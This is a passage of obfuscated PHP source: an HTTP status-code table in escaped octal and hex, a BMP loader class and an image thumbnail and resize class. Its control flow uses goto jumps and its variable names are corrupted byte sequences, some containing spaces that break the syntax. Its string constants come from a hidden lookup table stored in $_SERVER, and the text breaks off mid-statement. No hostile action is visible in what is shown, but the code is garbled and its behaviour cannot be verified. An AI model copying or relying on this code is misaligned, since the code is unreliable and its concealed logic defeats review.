"\65\60\x30" => "\111\x6e\x74\145\162\x6e\x61\x6c\40\123\145\162\166\x65\x72\40\x45\162\x72\157\x72", "\65\60\x31" => "\x4e\157\164\40\111\155\x70\x6c\x65\155\x65\156\164\145\x64", "\x35\60\x32" => "\x42\141\x64\x20\107\x61\x74\145\x77\141\171", "\65\60\x33" => "\x53\x65\x72\166\151\x63\x65\40\x55\x6e\x61\x76\141\x69\154\x61\x62\x6c\x65", "\x35\x30\x34" => "\107\x61\164\145\167\x61\171\x20\124\151\x6d\145\x6f\165\164", "\65\60\65" => "\110\x54\x54\x50\40\x56\x65\x72\x73\x69\157\x6e\x20\x6e\x6f\164\x20\163\165\160\160\x6f\162\x74\x65\x64", "\65\60\67" => "\111\x6e\163\165\x66\x66\151\143\151\145\156\x74\40\x53\164\x6f\x72\x61\x67\145"); public static function code($F¤¤ÄÚÂâÚ) { $a–¾ÉÍ¥îº =& $_SERVER[í…¶]; $F¤¤ÄÚÂâÚ = $F¤¤ÄÚÂâÚ . $a–¾ÉÍ¥îº[33]; $AòÈÀï‹Ú = self::$statusCode[$F¤¤ÄÚÂâÚ]; $AòÈÀï‹Ú = $AòÈÀï‹Ú ? "\110\x54\x54\120\57\61\56\x31\40{$F¤¤ÄÚÂâÚ}\x20" . $AòÈÀï‹Ú : $a–¾ÉÍ¥îº[33]; return $AòÈÀï‹Ú; } } class ImageGdBMP { public static function load($B„²­»Ğíå) { $fÜê…´òˆ÷ = fopen($B„²­»Ğíå, $_SERVER[í…¶][1517]); if ($fÜê…´òˆ÷ === !1) { return !1; } $d‰µªî…Óô = self::loadFromStream($fÜê…´òˆ÷); fclose($fÜê…´òˆ÷); return $d‰µªî…Óô; } public static function loadFromStream($a‡ÇëÑğ÷) { $Dá¦¢åŞİœ =& $_SERVER[í…¶]; $Fíô–¤‚ïŒ = fread($a‡ÇëÑğ÷, 14); if ($Fíô–¤‚ïŒ === !1) { return !1; } if ($Fíô–¤‚ïŒ[0] != $Dá¦¢åŞİœ[1828] || $Fíô–¤‚ïŒ[1] != $Dá¦¢åŞİœ[1829]) { return !1; } $E‘‘‘˜Ç§É = unpack($Dá¦¢åŞİœ[1830] . $Dá¦¢åŞİœ[1831] . $Dá¦¢åŞİœ[1832] . $Dá¦¢åŞİœ[1833] . $Dá¦¢åŞİœ[1834], $Fíô–¤‚ïŒ); return self::loadFromStreamAndFileHeader($a‡ÇëÑğ÷, $E‘‘‘˜Ç§É); } public static function loadFromStreamAndFileHeader($fÖêÆ¢ĞÙâ, array $bê£²Œ‰Ô¬) { goto d ªËÑƒÒ; dˆ°¨Şƒ¼: if ($D­±ÎƒÏœ¿ === !1) { return !1; } list(, $d‚Ã®¤‹Ì³) = unpack($B¼ç†ÓŠ«Ş[1835], $D­±ÎƒÏœ¿); if ($d‚Ã®¤‹Ì³ == 12) { goto DœµÈ¥…Ëº; EÚ£Õ¨¶„¦: $AæàÏ‘ƒ‹™ = 255; goto Ağ°Ê±°œ; CŠÊêøÆÛ: $C¾¦ºø«Ì› = $CÖô‹×äÖ = $B®Ôªã©…¤ = $BõÉÆŞÃÄ£ = 0; $CÚ¿È˜§Ù = 16711680; $B­Î£áÂ¯ = 65280; goto EÚ£Õ¨¶„¦; DœµÈ¥…Ëº: $D­±ÎƒÏœ¿ = fread($fÖêÆ¢ĞÙâ, $d‚Ã®¤‹Ì³ - 4); if ($D­±ÎƒÏœ¿ === !1) { return !1; } extract(unpack($B¼ç†ÓŠ«Ş[1836] . $B¼ç†ÓŠ«Ş[1837] . $B¼ç†ÓŠ«Ş[1838] . $B¼ç†ÓŠ«Ş[1839], $D­±ÎƒÏœ¿)); goto CŠÊêøÆÛ; Ağ°Ê±°œ: } else { if (124 < $d‚Ã®¤‹Ì³ || $d‚Ã®¤‹Ì³ < 40) { return !1; } else { goto D“»èŸ•Öç; cµ…‚×òÄ: if ($açÑ—µ”¡» & 2147483648) { $açÑ—µ”¡» = -(~$açÑ—µ”¡» & 4294967295) - 1; } if ($c“ö÷ùÇØí & 2147483648) { $c“ö÷ùÇØí = -(~$c“ö÷ùÇØí & 4294967295) - 1; } if ($AÁ’„ôË§— & 2147483648) { $AÁ’„ôË§— = -(~$AÁ’„ôË§— & 4294967295) - 1; } goto BÄÆ„©ùš·; BÄÆ„©ùš·: if ($Fó±Àõ÷éµ & 2147483648) { $Fó±Àõ÷éµ = -(~$Fó±Àõ÷éµ & 4294967295) - 1; } if ($bê£²Œ‰Ô¬[$B¼ç†ÓŠ«Ş[529]] != 0) { $CÓùÕíÚºÏ = $dê÷Œƒí­ï == 1 || $dê÷Œƒí­ï == 4 || $dê÷Œƒí­ï == 8 ? ($C¾¦ºø«Ì› ? $C¾¦ºø«Ì› : pow(2, $dê÷Œƒí­ï)) << 2 : 0; $cÑ…ôÆí÷ = $AŠŸÆ‘‰ ? $AŠŸÆ‘‰ : ($açÑ—µ”¡» * $dê÷Œƒí­ï + 31 >> 3 & ~3) * abs($c“ö÷ùÇØí); $d­Ü”æš² = $bê£²Œ‰Ô¬[$B¼ç†ÓŠ«Ş[529]] - $cÑ…ôÆí÷ - $CÓùÕíÚºÏ - 14; if ($d‚Ã®¤‹Ì³ < $d­Ü”æš² && 40 <= $d‚Ã®¤‹Ì³ && $d‚Ã®¤‹Ì³ <= 124) { $d‚Ã®¤‹Ì³ = $d­Ü”æš²; } } if ($d‚Ã®¤‹Ì³ - 40 > 0) { $D­±ÎƒÏœ¿ = fread($fÖêÆ¢ĞÙâ, $d‚Ã®¤‹Ì³ - 40); if ($D­±ÎƒÏœ¿ === !1) { return !1; } extract(unpack($B¼ç†ÓŠ«Ş[1849] . $B¼ç†ÓŠ«Ş[1850] . $B¼ç†ÓŠ«Ş[1851] . $B¼ç†ÓŠ«Ş[1852], $D­±ÎƒÏœ¿ . str_repeat($B¼ç†ÓŠ«Ş[1853], 120))); } else { $B®Ôªã©…¤ = $CÚ¿È˜§Ù = $B­Î£áÂ¯ = $AæàÏ‘ƒ‹™ = 0; } goto A—÷”çõù×; A—÷”çõù×: if (($dê÷Œƒí­ï == 16 || $dê÷Œƒí­ï == 24 || $dê÷Œƒí­ï == 32) && $BõÉÆŞÃÄ£ == 0 && $CÚ¿È˜§Ù == 0 && $B­Î£áÂ¯ == 0 && $AæàÏ‘ƒ‹™ == 0) { switch ($dê÷Œƒí­ï) { case 16: $CÚ¿È˜§Ù = 31744; $B­Î£áÂ¯ = 992; $AæàÏ‘ƒ‹™ = 31; break; case 24: case 32: $CÚ¿È˜§Ù = 16711680; $B­Î£áÂ¯ = 65280; $AæàÏ‘ƒ‹™ = 255; break; } } goto E…ŠÜ†– ; D“»èŸ•Öç: $D­±ÎƒÏœ¿ = fread($fÖêÆ¢ĞÙâ, 36); if ($D­±ÎƒÏœ¿ === !1) { return !1; } extract(unpack($B¼ç†ÓŠ«Ş[1840] . $B¼ç†ÓŠ«Ş[1841] . $B¼ç†ÓŠ«Ş[1838] . $B¼ç†ÓŠ«Ş[1842] . $B¼ç†ÓŠ«Ş[1843] . $B¼ç†ÓŠ«Ş[1844] . $B¼ç†ÓŠ«Ş[1845] . $B¼ç†ÓŠ«Ş[1846] . $B¼ç†ÓŠ«Ş[1847] . $B¼ç†ÓŠ«Ş[1848], $D­±ÎƒÏœ¿)); goto cµ…‚×òÄ; E…ŠÜ†– : } } goto dÍ‘ƒŒª‡Ì; Cá¦¥ò”Ÿ‚: $f’Ë¯à…‡ß = abs($c“ö÷ùÇØí); $f¬…¢Å‰Õ = $c“ö÷ùÇØí > 0 ? $f’Ë¯à…‡ß - 1 : 0; $eçò»ã–Åš = $c“ö÷ùÇØí > 0 ? -1 : 1; goto fôÛ¥¨À¬À; fôÛ¥¨À¬À: if ($dê÷Œƒí­ï == 1 || $dê÷Œƒí­ï == 4 || $dê÷Œƒí­ï == 8) { goto b×«ŞÛ£®×; EÆ°£Âæ“¡: $e”ÑËË¾»ß = array(); for ($aÅ†º½¦Âö = 0; $aÅ†º½¦Âö < $d‹âŠ´µ¶‚; ++$aÅ†º½¦Âö) { $D­±ÎƒÏœ¿ = fread($fÖêÆ¢ĞÙâ, $B¬¯›§®å‹); if ($D­±ÎƒÏœ¿ === !1) { imagedestroy($FîÀƒå®ÕŒ); return !1; } extract(unpack($B¼ç†ÓŠ«Ş[1854], $D­±ÎƒÏœ¿ . $B¼ç†ÓŠ«Ş[1853])); $e”ÑËË¾»ß[] = imagecolorallocate($FîÀƒå®ÕŒ, $DìÀÇ¶†Ş¯, $aÖß¥‚îÅª, $cÚëÏã» ó); } $aº²Ÿîùç² = 8 - $dê÷Œƒí­ï; goto f‘¾Ö’¾˜Š; f‘¾Ö’¾˜Š: $c“¤éÃ‹¤õ = (1 << $dê÷Œƒí­ï) - 1 << $aº²Ÿîùç²; if ($BõÉÆŞÃÄ£ == 1 || $BõÉÆŞÃÄ£ == 2) { $Cå²Ã—ºí = 0; $A„Òº¢ªñ = $dê÷Œƒí­ï >> 2 & 1; for (;;) { if ($Cå²Ã—ºí < -1 || $Cå²Ã—ºí > $açÑ—µ”¡» || $f¬…¢Å‰Õ < -1 || $f¬…¢Å‰Õ > $c“ö÷ùÇØí) { imagedestroy($FîÀƒå®ÕŒ); return !1; } $D­±ÎƒÏœ¿ = fread($fÖêÆ¢ĞÙâ, 1); if ($D­±ÎƒÏœ¿ === !1) { imagedestroy($FîÀƒå®ÕŒ); return !1; } switch ($D­±ÎƒÏœ¿) { case $B¼ç†ÓŠ«Ş[1853]: $D­±ÎƒÏœ¿ = fread($fÖêÆ¢ĞÙâ, 1); if ($D­±ÎƒÏœ¿ === !1) { imagedestroy($FîÀƒå®ÕŒ); return !1; } switch ($D­±ÎƒÏœ¿) { case $B¼ç†ÓŠ«Ş[1853]: $f¬…¢Å‰Õ += $eçò»ã–Åš; $Cå²Ã—ºí = 0; break; case $B¼ç†ÓŠ«Ş[1855]: $f¬…¢Å‰Õ = 0; $Cå²Ã—ºí = 0; break 3; case $B¼ç†ÓŠ«Ş[1856]: $D­±ÎƒÏœ¿ = fread($fÖêÆ¢ĞÙâ, 2); if ($D­±ÎƒÏœ¿ === !1) { imagedestroy($FîÀƒå®ÕŒ); return !1; } list(, $eöŒ‘áŸŠ, $CçÁÂÑŒäÚ) = unpack($B¼ç†ÓŠ«Ş[1857], $D­±ÎƒÏœ¿); $Cå²Ã—ºí += $eöŒ‘áŸŠ; $f¬…¢Å‰Õ += $CçÁÂÑŒäÚ * $eçò»ã–Åš; break; default: list(, $fµˆ‘ª‰Œ) = unpack($B¼ç†ÓŠ«Ş[1858], $D­±ÎƒÏœ¿); $a™¼ìë¬–¼ = ($fµˆ‘ª‰Œ >> $A„Òº¢ªñ) + ($fµˆ‘ª‰Œ & $A„Òº¢ªñ); $D­±ÎƒÏœ¿ = fread($fÖêÆ¢ĞÙâ, $a™¼ìë¬–¼ + 1 & ~1); if ($D­±ÎƒÏœ¿ === !1) { imagedestroy($FîÀƒå®ÕŒ); return !1; } for ($aÅ†º½¦Âö = 0, $AÄâ†¢ƒŸÁ = 0; $aÅ†º½¦Âö < $fµˆ‘ª‰Œ; ++$aÅ†º½¦Âö, ++$Cå²Ã—ºí, $AÄâ†¢ƒŸÁ += $dê÷Œƒí­ï) { list(, $EÃª¤¨’Á“) = unpack($B¼ç†ÓŠ«Ş[1858], $D­±ÎƒÏœ¿[$AÄâ†¢ƒŸÁ >> 3]); $cÚëÏã» ó = $AÄâ†¢ƒŸÁ & 7; imagesetpixel($FîÀƒå®ÕŒ, $Cå²Ã—ºí, $f¬…¢Å‰Õ, $e”ÑËË¾»ß[($EÃª¤¨’Á“ & $c“¤éÃ‹¤õ >> $cÚëÏã» ó) >> $aº²Ÿîùç² - $cÚëÏã» ó]); } break; } break; default: $aÂë“ÔåŒ› = fread($fÖêÆ¢ĞÙâ, 1); if ($aÂë“ÔåŒ› === !1) { imagedestroy($FîÀƒå®ÕŒ); return !1; } list(, $C²‹™®†ƒš, $EÃª¤¨’Á“) = unpack($B¼ç†ÓŠ«Ş[1857], $D­±ÎƒÏœ¿ . $aÂë“ÔåŒ›); for ($aÅ†º½¦Âö = 0, $AÄâ†¢ƒŸÁ = 0; $aÅ†º½¦Âö < $C²‹™®†ƒš; ++$aÅ†º½¦Âö, ++$Cå²Ã—ºí, $AÄâ†¢ƒŸÁ += $dê÷Œƒí­ï) { $cÚëÏã» ó = $AÄâ†¢ƒŸÁ & 7; imagesetpixel($FîÀƒå®ÕŒ, $Cå²Ã—ºí, $f¬…¢Å‰Õ, $e”ÑËË¾»ß[($EÃª¤¨’Á“ & $c“¤éÃ‹¤õ >> $cÚëÏã» ó) >> $aº²Ÿîùç² - $cÚëÏã» ó]); } break; } } } else { for ($dãîÀŠÂÜ° = 0; $dãîÀŠÂÜ° < $f’Ë¯à…‡ß; ++$dãîÀŠÂÜ°, $f¬…¢Å‰Õ += $eçò»ã–Åš) { $D­±ÎƒÏœ¿ = fread($fÖêÆ¢ĞÙâ, $D–óÓ…æ²˜); if ($D­±ÎƒÏœ¿ === !1) { imagedestroy($FîÀƒå®ÕŒ); return !1; } $AÄâ†¢ƒŸÁ = 0; for ($Cå²Ã—ºí = 0; $Cå²Ã—ºí < $açÑ—µ”¡»; ++$Cå²Ã—ºí, $AÄâ†¢ƒŸÁ += $dê÷Œƒí­ï) { list(, $EÃª¤¨’Á“) = unpack($B¼ç†ÓŠ«Ş[1858], $D­±ÎƒÏœ¿[$AÄâ†¢ƒŸÁ >> 3]); $cÚëÏã» ó = $AÄâ†¢ƒŸÁ & 7; imagesetpixel($FîÀƒå®ÕŒ, $Cå²Ã—ºí, $f¬…¢Å‰Õ, $e”ÑËË¾»ß[($EÃª¤¨’Á“ & $c“¤éÃ‹¤õ >> $cÚëÏã» ó) >> $aº²Ÿîùç² - $cÚëÏã» ó]); } } } goto DÒì‡šò’ö; b×«ŞÛ£®×: $FîÀƒå®ÕŒ = imagecreate($açÑ—µ”¡», $f’Ë¯à…‡ß); $B¬¯›§®å‹ = $d‚Ã®¤‹Ì³ == 12 ? 3 : 4; $d‹âŠ´µ¶‚ = $C¾¦ºø«Ì› ? $C¾¦ºø«Ì› : pow(2, $dê÷Œƒí­ï); goto EÆ°£Âæ“¡; DÒì‡šò’ö: } else { goto dßğ¶®ÉŠ¶; AŠƒ´À¿–ç: for ($dãîÀŠÂÜ° = 0; $dãîÀŠÂÜ° < $f’Ë¯à…‡ß; ++$dãîÀŠÂÜ°, $f¬…¢Å‰Õ += $eçò»ã–Åš) { $D­±ÎƒÏœ¿ = fread($fÖêÆ¢ĞÙâ, $D–óÓ…æ²˜); if ($D­±ÎƒÏœ¿ === !1) { imagedestroy($FîÀƒå®ÕŒ); return !1; } $AÄâ†¢ƒŸÁ = 0; for ($Cå²Ã—ºí = 0; $Cå²Ã—ºí < $açÑ—µ”¡»; ++$Cå²Ã—ºí, $AÄâ†¢ƒŸÁ += $bÅ™ëµ®õ­) { list(, $EÃª¤¨’Á“) = unpack($B¼ç†ÓŠ«Ş[1835], substr($D­±ÎƒÏœ¿, $AÄâ†¢ƒŸÁ, $bÅ™ëµ®õ­) . $B¼ç†ÓŠ«Ş[1859]); $b¬Şƒ«é® = $EÃª¤¨’Á“ & $B®Ôªã©…¤; $aòÜã˜›Ñá = $EÃª¤¨’Á“ & $CÚ¿È˜§Ù; $d³ àê³á’ = $EÃª¤¨’Á“ & $B­Î£áÂ¯; $e‰’˜×¶Ñ¤ = $EÃª¤¨’Á“ & $AæàÏ‘ƒ‹™; $a¢ÈÀ¬«ô˜ = $AâÄÉŸëã - (($b¬Şƒ«é® << 7) - $b¬Şƒ«é®) * $c³ô®š¨…; $DìÀÇ¶†Ş¯ = (($aòÜã˜›Ñá << 8) - $aòÜã˜›Ñá) * $b¢¢Ä¼ö³¡; $aÖß¥‚îÅª = (($d³ àê³á’ << 8) - $d³ àê³á’) * $A“‚µÀµá·; $cÚëÏã» ó = (($e‰’˜×¶Ñ¤ << 8) - $e‰’˜×¶Ñ¤) * $cÃ¯Ö¡Ğ£É; imagesetpixel($FîÀƒå®ÕŒ, $Cå²Ã—ºí, $f¬…¢Å‰Õ, $a¢ÈÀ¬«ô˜ << 24 | $DìÀÇ¶†Ş¯ << 16 | $aÖß¥‚îÅª << 8 | $cÚëÏã» ó); } } imagealphablending($FîÀƒå®ÕŒ, !0); goto BÒÆìš’ˆ; Aµ„Šİ””: $b¢¢Ä¼ö³¡ = $CÚ¿È˜§Ù ? 1 / $CÚ¿È˜§Ù : 1; $A“‚µÀµá· = $B­Î£áÂ¯ ? 1 / $B­Î£áÂ¯ : 1; $cÃ¯Ö¡Ğ£É = $AæàÏ‘ƒ‹™ ? 1 / $AæàÏ‘ƒ‹™ : 1; goto AŠƒ´À¿–ç; dßğ¶®ÉŠ¶: $FîÀƒå®ÕŒ = imagecreatetruecolor($açÑ—µ”¡», $f’Ë¯à…‡ß); imagealphablending($FîÀƒå®ÕŒ, !1); if ($B®Ôªã©…¤) { imagesavealpha($FîÀƒå®ÕŒ, !0); } goto BßÍôê¨²; BßÍôê¨²: $bÅ™ëµ®õ­ = $dê÷Œƒí­ï >> 3; $AâÄÉŸëã = $B®Ôªã©…¤ ? 127 : 0; $c³ô®š¨… = $B®Ôªã©…¤ ? 1 / $B®Ôªã©…¤ : 1; goto Aµ„Šİ””; BÒÆìš’ˆ: } return $FîÀƒå®ÕŒ; goto eâä±ø†„è; dÍ‘ƒŒª‡Ì: if ($açÑ—µ”¡» == 0 || $c“ö÷ùÇØí == 0 || $a‘›à˜É¢¥ != 1 || ($B®Ôªã©…¤ & $CÚ¿È˜§Ù) != 0 || ($B®Ôªã©…¤ & $B­Î£áÂ¯) != 0 || ($B®Ôªã©…¤ & $AæàÏ‘ƒ‹™) != 0 || ($CÚ¿È˜§Ù & $B­Î£áÂ¯) != 0 || ($CÚ¿È˜§Ù & $AæàÏ‘ƒ‹™) != 0 || ($B­Î£áÂ¯ & $AæàÏ‘ƒ‹™) != 0) { return !1; } if ($BõÉÆŞÃÄ£ == 4 || $BõÉÆŞÃÄ£ == 5) { $D­±ÎƒÏœ¿ = stream_get_contents($fÖêÆ¢ĞÙâ, $AŠŸÆ‘‰); if ($D­±ÎƒÏœ¿ === !1) { return !1; } return imagecreatefromstring($D­±ÎƒÏœ¿); } $D–óÓ…æ²˜ = $açÑ—µ”¡» * $dê÷Œƒí­ï + 31 >> 3 & ~3; goto Cá¦¥ò”Ÿ‚; d ªËÑƒÒ: $B¼ç†ÓŠ«Ş =& $_SERVER[í…¶]; if ($bê£²Œ‰Ô¬[$B¼ç†ÓŠ«Ş[397]] != 19778) { return !1; } $D­±ÎƒÏœ¿ = fread($fÖêÆ¢ĞÙâ, 4); goto dˆ°¨Şƒ¼; eâä±ø†„è: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($E—…ç·ÇèÒ, $Aˆ‰¯Á‹æ›) { goto B¤¢÷Ã®ù; FÊÆ‰ŒÔ…§: if (!$this->im) { return !1; } $A†£ï™âÚ‰ = $_SERVER[í…¶][33]; $this->imgData = GetImageSize($E—…ç·ÇèÒ, $A†£ï™âÚ‰); goto FƒØ‘—‚É—; B¤¢÷Ã®ù: $this->srcFile = $E—…ç·ÇèÒ; $this->echoType = $Aˆ‰¯Á‹æ›; $this->im = self::image($E—…ç·ÇèÒ); goto FÊÆ‰ŒÔ…§; FƒØ‘—‚É—: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto EòºÅğ‚î; EòºÅğ‚î: } public static function image($f˜…öŞÄ§) { $EÔø†»Û œ =& $_SERVER[í…¶]; $fÃÃ¥³À„œ = $EÔø†»Û œ[33]; $C®ª½ã¢§ì = GetImageSize($f˜…öŞÄ§, $fÃÃ¥³À„œ); $BéŞ§èÈ”Ó = !1; switch ($C®ª½ã¢§ì[2]) { case IMAGETYPE_GIF: if (!function_exists($EÔø†»Û œ[1860])) { break; } $BéŞ§èÈ”Ó = imagecreatefromgif($f˜…öŞÄ§); break; case IMAGETYPE_JPEG: if (!function_exists($EÔø†»Û œ[1861])) { break; } $BéŞ§èÈ”Ó = imagecreatefromjpeg($f˜…öŞÄ§); break; case IMAGETYPE_PNG: if (!function_exists($EÔø†»Û œ[1862])) { break; } $BéŞ§èÈ”Ó = @imagecreatefrompng($f˜…öŞÄ§); imagesavealpha($BéŞ§èÈ”Ó, !0); break; case IMAGETYPE_XBM: $BéŞ§èÈ”Ó = imagecreatefromxbm($f˜…öŞÄ§); break; case IMAGETYPE_WBMP: $BéŞ§èÈ”Ó = imagecreatefromwbmp($f˜…öŞÄ§); break; case IMAGETYPE_BMP: $BéŞ§èÈ”Ó = imagecreatefrombmp($f˜…öŞÄ§); break; default: break; } return $BéŞ§èÈ”Ó; } public static function imageSize($D·¶‘ˆÙÅ“) { $aĞªÙª£ÇÚ =& $_SERVER[í…¶]; $EµÃä²’Å² = GetImageSize($D·¶‘ˆÙÅ“); if (!$EµÃä²’Å²) { return !1; } return array($aĞªÙª£ÇÚ[1863] => $EµÃä²’Å²[0], $aĞªÙª£ÇÚ[1864] => $EµÃä²’Å²[1]); } function distortion($F‡ôîò—‹‘, $aµö˜¥Øº, $cù‚¢Üè¦ß) { $B™ÍÒ‹ËíÏ = $this->creatImage($this->im, $aµö˜¥Øº, $cù‚¢Üè¦ß, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($B™ÍÒ‹ËíÏ, $F‡ôîò—‹‘); } function prorate($a¯» –¼ä, $F¥‡ö¬¦“ä, $fª’…İâË÷) { $A¡˜ß•÷¸¹ = $F¥‡ö¬¦“ä / $fª’…İâË÷; $E™ƒ’¯ß÷Ğ = $this->srcW / $this->srcH; if ($A¡˜ß•÷¸¹ <= $E™ƒ’¯ß÷Ğ) { $FÁâÑˆÊ¯ª = $F¥‡ö¬¦“ä; $dº¢·²½®£ = $FÁâÑˆÊ¯ª * ($this->srcH / $this->srcW); } else { $dº¢·²½®£ = $fª’…İâË÷; $FÁâÑˆÊ¯ª = $dº¢·²½®£ * ($this->srcW / $this->srcH); } if ($this->srcW > $F¥‡ö¬¦“ä || $this->srcH > $fª’…İâË÷) { $c±Œ¢æ¡ç = $this->creatImage($this->im, $FÁâÑˆÊ¯ª, $dº¢·²½®£, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($c±Œ¢æ¡ç, $a¯» –¼ä); } else { $c±Œ¢æ¡ç = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($c±Œ¢æ¡ç, $a¯» –¼ä); } } function cut($f·áÂ»ÉÓğ, $a®ÌğÖÅÓ, $a«·¾¹ŞªÇ) { goto AĞñ’è­»Š; eÎšÔ¡š’: $DÎ‘å»îÂ = $this->creatImage($this->im, $ašá»Ã¶´, $d±ÉíŠÅ¹, 0, 0, 0, 0, $this->srcW, $this->srcH); $F¾›¹İÒ = $this->creatImage($DÎ‘å»îÂ, $a®ÌğÖÅÓ, $a«·¾¹ŞªÇ, 0, 0, ($ašá»Ã¶´ - $a®ÌğÖÅÓ) / 2, ($d±ÉíŠÅ¹ - $a«·¾¹ŞªÇ) / 2, $a®ÌğÖÅÓ, $a«·¾¹ŞªÇ); imageDestroy($DÎ‘å»îÂ); goto c³³º›Å£‰; c³³º›Å£‰: return $this->echoImage($F¾›¹İÒ, $f·áÂ»ÉÓğ); goto EØŠñ¤İš; AĞñ’è­»Š: $CÔ¯ß«´— = $a®ÌğÖÅÓ / $a«·¾¹ŞªÇ; $D¬ÊÙŸ•…½ = $this->srcW / $this->srcH; if ($CÔ¯ß«´— <= $D¬ÊÙŸ•…½) { $d±ÉíŠÅ¹ = $a«·¾¹ŞªÇ; $ašá»Ã¶´ = $d±ÉíŠÅ¹ * ($this->srcW / $this->srcH); } else { $ašá»Ã¶´ = $a®ÌğÖÅÓ; $d±ÉíŠÅ¹ = $ašá»Ã¶´ * ($this->srcH / $this->srcW); } goto eÎšÔ¡š’; EØŠñ¤İš: } function backFill($AàÚ„ã¾, $EáØ™Æ»°, $aœ‡Æ–±âŞ, $F¹ƒğ®ª„ = false, $B§™…†æ è = 255, $f¶±»Œµ»’ = 255, $fµÚºó½Ş¥ = 255) { goto e„Šù±»Ä›; b¿Öå¦ˆ¬: if (function_exists($_SERVER[í…¶][1865])) { @($fô­ø‰†ò = imageCreateTrueColor($EáØ™Æ»°, $aœ‡Æ–±âŞ)); if (!$fô­ø‰†ò) { $fô­ø‰†ò = imageCreate($EáØ™Æ»°, $aœ‡Æ–±âŞ); } } else { $fô­ø‰†ò = imageCreate($EáØ™Æ»°, $aœ‡Æ–±âŞ); } $c³ÄÃôôõ = ($aœ‡Æ–±âŞ - $F¡Õ¬¶ß£¡) / 2; $d¤•›İæ = imagecolorallocate($fô­ø‰†ò, $B§™…†æ è, $f¶±»Œµ»’, $fµÚºó½Ş¥); goto EÜ«ŞƒïÚÇ; e„Šù±»Ä›: $fÙİ§ò»¦ = $EáØ™Æ»° / $aœ‡Æ–±âŞ; $EÙ’Íô—Ïê = $this->srcW / $this->srcH; if ($fÙİ§ò»¦ <= $EÙ’Íô—Ïê) { $EõÙ®Íñ = $EáØ™Æ»°; $F¡Õ¬¶ß£¡ = $EõÙ®Íñ * ($this->srcH / $this->srcW); } else { $F¡Õ¬¶ß£¡ = $aœ‡Æ–±âŞ; $EõÙ®Íñ = $F¡Õ¬¶ß£¡ * ($this->srcW / $this->srcH); } goto b¿Öå¦ˆ¬; EÜ«ŞƒïÚÇ: if ($F¹ƒğ®ª„) { $d¤•›İæ = imageColorTransparent($fô­ø‰†ò, $d¤•›İæ); $c³ÄÃôôõ = $aœ‡Æ–±âŞ - $F¡Õ¬¶ß£¡; } imageFilledRectangle($fô­ø‰†ò, 0, 0, $EáØ™Æ»°, $aœ‡Æ–±âŞ, $d¤•›İæ); if ($this->srcW > $EáØ™Æ»° || $this->srcH > $aœ‡Æ–±âŞ) { $Bã¯¬˜ÚÒæ = $this->creatImage($this->im, $EõÙ®Íñ, $F¡Õ¬¶ß£¡, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($EõÙ®Íñ < $EáØ™Æ»°) { imageCopy($fô­ø‰†ò, $Bã¯¬˜ÚÒæ, ($EáØ™Æ»° - $EõÙ®Íñ) / 2, 0, 0, 0, $EõÙ®Íñ, $F¡Õ¬¶ß£¡); } else { if ($F¡Õ¬¶ß£¡ < $aœ‡Æ–±âŞ) { imageCopy($fô­ø‰†ò, $Bã¯¬˜ÚÒæ, 0, $c³ÄÃôôõ, 0, 0, $EõÙ®Íñ, $F¡Õ¬¶ß£¡); } else { imageCopy($fô­ø‰†ò, $Bã¯¬˜ÚÒæ, 0, 0, 0, 0, $EõÙ®Íñ, $F¡Õ¬¶ß£¡); } } } else { imageCopyMerge($fô­ø‰†ò, $this->im, ($EáØ™Æ»° - $EõÙ®Íñ) / 2, $c³ÄÃôôõ, 0, 0, $EõÙ®Íñ, $F¡Õ¬¶ß£¡, 100); } goto C¦Ò“Ã®Õ¥; C¦Ò“Ã®Õ¥: return $this->echoImage($fô­ø‰†ò, $AàÚ„ã¾); goto D›ô¦ŒŸ‘ó; D›ô¦ŒŸ‘ó: } function creatImage($A·“£Ã¿ãç, $b‹Î¡„Ç‹¸, $d´Ô‡ “·ø, $BÑĞ•Ú÷‘Î, $Aõ…‚¡Òì, $eôİìÕŞ¸Ä, $C¬¬›Šï·¶, $a—¼ÄŠĞ£, $dÕ”‹ß³‰Î) { if (function_exists($_SERVER[í…¶][1865])) { @($fŞ˜‰ÇÍ‰¨ = ImageCreateTrueColor($b‹Î¡„Ç‹¸, $d´Ô‡ “·ø)); @imagealphablending($fŞ˜‰ÇÍ‰¨, !1); @imagesavealpha($fŞ˜‰ÇÍ‰¨, !0); if ($fŞ˜‰ÇÍ‰¨) { imageCopyResampled($fŞ˜‰ÇÍ‰¨, $A·“£Ã¿ãç, $BÑĞ•Ú÷‘Î, $Aõ…‚¡Òì, $eôİìÕŞ¸Ä, $C¬¬›Šï·¶, $b‹Î¡„Ç‹¸, $d´Ô‡ “·ø, $a—¼ÄŠĞ£, $dÕ”‹ß³‰Î); } else { $fŞ˜‰ÇÍ‰¨ = ImageCreate($b‹Î¡„Ç‹¸, $d´Ô‡ “·ø); imageCopyResized($fŞ˜‰ÇÍ‰¨, $A·“£Ã¿ãç, $BÑĞ•Ú÷‘Î, $Aõ…‚¡Òì, $eôİìÕŞ¸Ä, $C¬¬›Šï·¶, $b‹Î¡„Ç‹¸, $d´Ô‡ “·ø, $a—¼ÄŠĞ£, $dÕ”‹ß³‰Î); } } else { $fŞ˜‰ÇÍ‰¨ = ImageCreate($b‹Î¡„Ç‹¸, $d´Ô‡ “·ø); imageCopyResized($fŞ˜‰ÇÍ‰¨, $A·“£Ã¿ãç, $BÑĞ•Ú÷‘Î, $Aõ…‚¡Òì, $eôİìÕŞ¸Ä, $C¬¬›Šï·¶, $b‹Î¡„Ç‹¸, $d´Ô‡ “·ø, $a—¼ÄŠĞ£, $dÕ”‹ß³‰Î); } return $fŞ˜‰ÇÍ‰¨; } public function imgRotate($BÎ…¿Ì©Ë, $b‡òËåŠÉ) { goto eùù…Ü‚†; D¹°‡õÁ™·: return $b÷•å£Šç; goto Cëö‹í¯; b¢æ‡‹ÇŒº: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $b÷•å£Šç = imagegif($dîƒ‹©ÅÖí, $BÎ…¿Ì©Ë); break; case IMAGETYPE_JPEG: $b÷•å£Šç = imagejpeg($dîƒ‹©ÅÖí, $BÎ…¿Ì©Ë, 100); break; case IMAGETYPE_PNG: $b÷•å£Šç = 